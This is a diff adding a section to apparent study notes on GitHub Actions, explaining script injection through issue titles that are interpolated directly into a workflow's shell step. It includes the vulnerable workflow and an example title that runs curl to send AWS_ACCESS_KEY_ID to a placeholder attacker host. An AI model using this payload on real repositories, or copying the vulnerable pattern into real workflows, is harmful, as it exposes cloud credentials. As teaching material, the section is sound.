@@ -541,4 +541,23 @@ If your custom Action is stored in a public repository, it can also be published
 - Permission Issues
   - GitHub Actions supports fine-grained permissions control
 
+### 132. Undestanding Script Injection Attacks
+
+```yml
+# .github/workflows/script-injection.yml
+run: |
+  issue_title="${{ github.event.issue.title }}"
+  if [[ "$issue_title" == *"bug"* ]]; then
+  echo "Issue is about a bug!"
+  else
+  echo "Issue is not about a bug"
+  fi
+```
+
+- Add an issue titled `a"; echo Got your secrests"`
+- Add an issue titled `a"; curl http://my-bad-site.com?abc=$AWS_ACCESS_KEY_ID"`
+
+> Solution \
+> use actions or environment variable
+
 </details>
